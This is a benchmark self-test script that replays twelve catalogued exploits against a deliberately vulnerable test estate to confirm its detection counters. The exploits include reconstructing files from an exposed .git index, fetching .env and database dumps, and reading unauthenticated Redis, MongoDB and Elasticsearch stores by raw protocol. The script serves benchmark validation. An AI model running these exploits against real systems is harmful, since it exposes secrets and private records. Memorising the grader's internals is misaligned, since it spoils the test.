#!/usr/bin/env python3
"""Replay every catalog exploit for the infra target and assert each counter fires once.

This is what stops the corpus from being decorative. An entry that claims a document is
exposed, but whose replay no longer retrieves it, is worse than no entry at all: every
tool silently loses a point it could never have won, and "nobody found it" becomes
indistinguishable from "it is hard".

What is being proven here is narrower than "the file is reachable". Every counter on
this target is written against an effect -- a document that left the server whole, a
listing that carried names, a datastore that executed a read and had something to return
-- so a replay that merely asks for a path and gets a 200 will not move anything, and a
failure below means the estate has stopped leaking rather than that the request 404ed.

Identification of this traffic as the platform's own is by SOURCE ADDRESS, not by any
marker header: it must arrive from the operations network, whose range the agent holds
in TELEMETRY_SYNTHETIC_CIDRS. A marker header would be visible to a tool through any
reflection or header-injection flaw and would hand it the shape of the grader. There is
nothing in the requests below that identifies the sender.

That is why every default address below is an operations-network name (web01, cache01,
ops01, records01, search01) rather than the customer-facing one. The resolver is
dual-homed; reaching a target by its customer-facing name would leave this replay
arriving from the customer-facing address, and it would be scored as somebody's
exploitation rather than recognised as ours.

The target must be freshly deployed before this runs and is left deployed after it:

    docker compose exec infra-web /usr/local/bin/state-reset
    ... run this ...
    docker compose exec infra-web /usr/local/bin/state-reset

Usage
-----
    python3 targets/infra/selftest.py                # replay + assertions
    python3 targets/infra/selftest.py --no-collector # replay only

Run it from the resolver, which is the one container with both a route to the targets
and loopback access to the platform's own API:

    docker compose exec resolver python /w/targets/infra/selftest.py

Nothing here needs a third-party library: the key/value protocol and the document
store's wire format are spoken by hand, which is also why this file has no dependency
that could drift away from what the target actually runs.

Environment
-----------
    INFRA_WEB_HOST       default web01            the web host, operations name
    INFRA_CACHE          default cache01:6379
    INFRA_QUEUE          default ops01:6380
    INFRA_RECORDS        default records01:27017
    INFRA_SEARCH         default http://search01:9200
    INFRA_RECORDS_DB     default nlf_records
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
    INFRA_SETTLE_SECONDS default 10
"""

from __future__ import annotations

import http.client
import json
import os
import re
import socket
import struct
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

WEB_HOST = os.environ.get("INFRA_WEB_HOST", "web01")
WEB_PORT = int(os.environ.get("INFRA_WEB_PORT", "80"))
CACHE = os.environ.get("INFRA_CACHE", "cache01:6379")
QUEUE = os.environ.get("INFRA_QUEUE", "ops01:6380")
RECORDS = os.environ.get("INFRA_RECORDS", "records01:27017")
RECORDS_DB = os.environ.get("INFRA_RECORDS_DB", "nlf_records")
SEARCH = os.environ.get("INFRA_SEARCH", "http://search01:9200").rstrip("/")
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")
SETTLE = float(os.environ.get("INFRA_SETTLE_SECONDS", "10"))

CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"

ARCHIVE = "/media/wwwroot-preflight-20260712.tar.gz"


# ---------------------------------------------------------------------------
# catalog: id <-> counter name
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal without requiring a YAML parser."""
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-INFR-*.yaml")):
        text = path.read_text()
        identifier = re.search(r"^id:\s*(\S+)", text, re.M)
        signal = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if identifier and signal:
            out[identifier.group(1)] = signal.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# the web host
# ---------------------------------------------------------------------------

def fetch(path: str, method: str = "GET", host: str | None = None,
          headers: dict | None = None) -> tuple[int, bytes]:
    """One request, read to the end. Reading to the end is the point: a counter that
    moves on a whole document must not be satisfied by a connection dropped early."""
    connection = http.client.HTTPConnection(WEB_HOST, WEB_PORT, timeout=30)
    try:
        sent = dict(headers or {})
        if host:
            sent["Host"] = host
        connection.request(method, path, headers=sent)
        response = connection.getresponse()
        body = response.read()
        return response.status, body
    finally:
        connection.close()


def poc_0001() -> str:
    status, body = fetch("/media/")
    names = re.findall(rb'href="([^"?/][^"]*)"', body)
    return f"{status}, {len(names)} names in the listing"


def poc_0002() -> str:
    """Take the index, then take the content of a file it names.

    The object identifiers come out of the index rather than from a list written here,
    which is the same route a copy of the repository is reconstructed by.
    """
    status, index = fetch("/.git/index")
    if status != 200 or index[:4] != b"DIRC":
        return f"index not served ({status})"
    count = struct.unpack(">I", index[8:12])[0]
    offset, found = 12, []
    for _ in range(count):
        object_id = index[offset + 40:offset + 60].hex()
        end = index.index(b"\0", offset + 62)
        name = index[offset + 62:end].decode(errors="replace")
        entry = 62 + (end - (offset + 62))
        offset += entry + (8 - (entry % 8))
        found.append((name, object_id))
    for name, object_id in found:
        code, blob = fetch(f"/.git/objects/{object_id[:2]}/{object_id[2:]}")
        if code == 200 and blob:
            return f"index listed {len(found)} files; took {name} ({len(blob)} bytes)"
    return f"index listed {len(found)} files; no object was served"


def poc_0003() -> str:
    status, body = fetch("/.env")
    return f"{status}, {len(body)} bytes"


def poc_0004() -> str:
    status, body = fetch("/api-docs/openapi.yaml")
    return f"{status}, {len(body)} bytes"


def poc_0005() -> str:
    status, body = fetch("/dump.sql.gz")
    return f"{status}, {len(body)} bytes"


def poc_0006() -> str:
    """The diagnostic method, spoken on a raw socket.

    A client library would refuse the method or normalise the request out of shape, and
    what is being proven is that the request comes back verbatim.
    """
    request = (
        f"TRACE / HTTP/1.1\r\n"
        f"Host: {WEB_HOST}\r\n"
        f"X-Works-Order: 4471\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    with socket.create_connection((WEB_HOST, WEB_PORT), timeout=15) as sock:
        sock.sendall(request)
        sock.settimeout(10)
        chunks = []
        while True:
            try:
                block = sock.recv(65536)
            except socket.timeout:
                break
            if not block:
                break
            chunks.append(block)
    reply = b"".join(chunks)
    echoed = b"X-Works-Order: 4471" in reply
    return f"{len(reply)} bytes back, request echoed: {echoed}"


def poc_0011() -> str:
    """The working-copy database, then a pristine copy it points at."""
    status, database = fetch("/careers/portal/.svn/wc.db")
    if status != 200:
        return f"the working-copy database was not served ({status})"
    digests = re.findall(rb"\$sha1\$([0-9a-f]{40})", database)
    for digest in digests:
        digest = digest.decode()
        code, body = fetch(f"/careers/portal/.svn/pristine/{digest[:2]}/{digest}.svn-base")
        if code == 200 and body:
            return (f"database served ({len(database)} bytes), {len(digests)} checksums; "
                    f"took one pristine copy ({len(body)} bytes)")
    return f"database served, {len(digests)} checksums, no pristine copy served"


def poc_0012() -> str:
    status, body = fetch(ARCHIVE)
    return f"{status}, {len(body)} bytes"


# ---------------------------------------------------------------------------
# the key/value stores
# ---------------------------------------------------------------------------

class KeyValue:
    def __init__(self, address: str, timeout: float = 10.0) -> None:
        host, _, port = address.rpartition(":")
        self.sock = socket.create_connection((host, int(port)), timeout=timeout)
        self.buffer = b""

    def command(self, *args):
        out = f"*{len(args)}\r\n".encode()
        for argument in args:
            raw = argument if isinstance(argument, bytes) else str(argument).encode()
            out += b"$%d\r\n%s\r\n" % (len(raw), raw)
        self.sock.sendall(out)
        return self.reply()

    def line(self) -> bytes:
        while b"\r\n" not in self.buffer:
            block = self.sock.recv(65536)
            if not block:
                raise ConnectionError("the store closed the connection")
            self.buffer += block
        line, _, rest = self.buffer.partition(b"\r\n")
        self.buffer = rest
        return line

    def exact(self, count: int) -> bytes:
        while len(self.buffer) < count:
            block = self.sock.recv(65536)
            if not block:
                raise ConnectionError("the store closed the connection")
            self.buffer += block
        out, self.buffer = self.buffer[:count], self.buffer[count:]
        return out

    def reply(self):
        head = self.line()
        kind, rest = head[:1], head[1:]
        if kind in (b"+", b"-"):
            return rest.decode()
        if kind == b":":
            return int(rest)
        if kind == b"$":
            length = int(rest)
            return None if length < 0 else self.exact(length + 2)[:-2]
        if kind == b"*":
            count = int(rest)
            return None if count < 0 else [self.reply() for _ in range(count)]
        raise RuntimeError(f"unexpected reply {head!r}")

    def close(self) -> None:
        self.sock.close()


def _read_store(address: str) -> str:
    store = KeyValue(address)
    try:
        # Enumerate first -- which is itself a disclosure -- then read one of the keys
        # the enumeration returned, which is the second.
        cursor, keys = store.command("SCAN", 0, "COUNT", 100)
        keys = [key.decode(errors="replace") for key in keys]
        if not keys:
            return "the store returned an empty keyspace"
        for key in keys:
            kind = store.command("TYPE", key)
            if kind == "string":
                value = store.command("GET", key)
                return f"{len(keys)} keys enumerated; read {key} ({len(value or b'')} bytes)"
            if kind == "list":
                value = store.command("LRANGE", key, 0, 5)
                return f"{len(keys)} keys enumerated; read {key} ({len(value or [])} entries)"
            if kind == "hash":
                value = store.command("HGETALL", key)
                return f"{len(keys)} keys enumerated; read {key} ({len(value or []) // 2} fields)"
        return f"{len(keys)} keys enumerated; none of a kind this replay reads"
    finally:
        store.close()


def poc_0007() -> str:
    return _read_store(CACHE)


def poc_0010() -> str:
    return _read_store(QUEUE)


# ---------------------------------------------------------------------------
# the document store: the wire format, by hand
# ---------------------------------------------------------------------------

def bson(document: dict) -> bytes:
    """Encode the handful of value kinds a command document needs."""
    body = b""
    for key, value in document.items():
        name = key.encode() + b"\0"
        if isinstance(value, bool):
            body += b"\x08" + name + (b"\x01" if value else b"\x00")
        elif isinstance(value, int):
            body += b"\x10" + name + struct.pack("<i", value)
        elif isinstance(value, str):
            encoded = value.encode() + b"\0"
            body += b"\x02" + name + struct.pack("<i", len(encoded)) + encoded
        elif isinstance(value, dict):
            body += b"\x03" + name + bson(value)
        else:
            raise TypeError(f"no encoding for {type(value)!r}")
    return struct.pack("<i", len(body) + 5) + body + b"\0"


def run_command(document: dict) -> int:
    """Send one command and read the reply header. The reply is not parsed: what is
    being proven is that the store executed it, which the store records itself."""
    host, _, port = RECORDS.rpartition(":")
    payload = struct.pack("<I", 0) + b"\x00" + bson(document)
    header = struct.pack("<iiii", 16 + len(payload), 1, 0, 2013)
    with socket.create_connection((host, int(port)), timeout=20) as sock:
        sock.sendall(header + payload)
        head = b""
        while len(head) < 16:
            block = sock.recv(16 - len(head))
            if not block:
                raise ConnectionError("the store closed the connection")
            head += block
        length = struct.unpack("<i", head[:4])[0]
        body, remaining = b"", length - 16
        while remaining > 0:
            block = sock.recv(min(65536, remaining))
            if not block:
                break
            body += block
            remaining -= len(block)
    return len(body)


def poc_0008() -> str:
    listed = run_command({"listDatabases": 1, "$db": "admin"})
    read = run_command({"find": "enquiries", "limit": 5, "$db": RECORDS_DB})
    return f"database listing {listed} bytes, query reply {read} bytes"


# ---------------------------------------------------------------------------
# the search cluster
# ---------------------------------------------------------------------------

def search(path: str) -> tuple[int, int]:
    request = urllib.request.Request(SEARCH + path, method="GET")
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            return response.status, len(response.read())
    except urllib.error.HTTPError as error:
        return error.code, len(error.read())


def poc_0009() -> str:
    listed = search("/_cat/indices")
    searched = search("/_all/_search?q=*&size=10")
    return f"index listing {listed}, search {searched}"


POCS = [
    ("BENCH-INFR-0001", poc_0001),
    ("BENCH-INFR-0002", poc_0002),
    ("BENCH-INFR-0003", poc_0003),
    ("BENCH-INFR-0004", poc_0004),
    ("BENCH-INFR-0005", poc_0005),
    ("BENCH-INFR-0006", poc_0006),
    ("BENCH-INFR-0007", poc_0007),
    ("BENCH-INFR-0008", poc_0008),
    ("BENCH-INFR-0009", poc_0009),
    ("BENCH-INFR-0010", poc_0010),
    ("BENCH-INFR-0011", poc_0011),
    ("BENCH-INFR-0012", poc_0012),
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    request = urllib.request.Request(ENDPOINT + path, data=data, method=method,
                                     headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(request, timeout=15) as response:
        payload = response.read()
    return json.loads(payload) if payload else None


def main() -> int:
    signals = load_signals()
    missing = [identifier for identifier, _ in POCS if identifier not in signals]
    if missing:
        print(f"catalog entries without a counter: {', '.join(missing)}", file=sys.stderr)
        return 2
    by_signal = {signal: identifier for identifier, signal in signals.items()}

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "infra-poc-replay",
                "targets": ["infra"],
                "notes": "targets/infra/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as error:
            print(f"cannot reach the platform API at {ENDPOINT}: {error}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    for identifier, replay in POCS:
        print(f"  replaying {identifier} ... ", end="", flush=True)
        try:
            print(replay())
        except (OSError, ConnectionError, RuntimeError, ValueError) as error:
            print(f"FAILED to run: {error!r}")

    if not use_api:
        print("replay done (no assertions)")
        return 0

    # The readers are followers: the web host's log, the document store's profile and
    # the search cluster's log are all read a moment after the event they describe.
    print(f"waiting {SETTLE}s for the readers to catch up ...")
    time.sleep(SETTLE)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    details: dict[str, str] = {}
    peerless: dict[str, int] = {}
    for event in events:
        record = event.get("payload", event) if isinstance(event.get("payload"), dict) else event
        signal = record.get("signal")
        if not signal:
            continue
        counts[signal] = counts.get(signal, 0) + 1
        if not record.get("peer_ip") or record.get("peer_missing"):
            peerless[signal] = peerless.get(signal, 0) + 1
        attributes = record.get("attributes") or record.get("evidence") or {}
        if attributes.get("detail") and signal not in details:
            details[signal] = attributes["detail"]

    print()
    failures = []
    for identifier, _ in POCS:
        signal = signals[identifier]
        seen = counts.get(signal, 0)
        without_peer = peerless.get(signal, 0)
        state = "ok  " if seen == 1 and not without_peer else "FAIL"
        print(f"{state} {identifier}  {signal}  count={seen}"
              + (f"  without peer={without_peer}" if without_peer else ""))
        if signal in details:
            print(f"       {details[signal][:300]}")
        if seen != 1 or without_peer:
            failures.append(identifier)

    for signal in sorted(set(counts) - set(by_signal)):
        print(f"FAIL unexpected counter {signal} ({counts[signal]}) -- another target's?")
        failures.append(signal)

    print()
    if failures:
        print(f"{len(failures)} of {len(POCS)} entries did not fire exactly once with a peer")
        print("count 0: the estate stopped leaking -- the document is no longer served "
              "whole, the store no longer executes the command, or the reader lost the "
              "server's log format.")
        print("count >1: something is counting a request rather than an effect, which "
              "would hand tools free points.")
        print("without peer: a counter lost the address of the client it was raised "
              "for, and cannot be told from an ordinary background job.")
        return 1

    print(f"all {len(POCS)} counters fired exactly once, each carrying a peer address")
    return 0


if __name__ == "__main__":
    sys.exit(main())
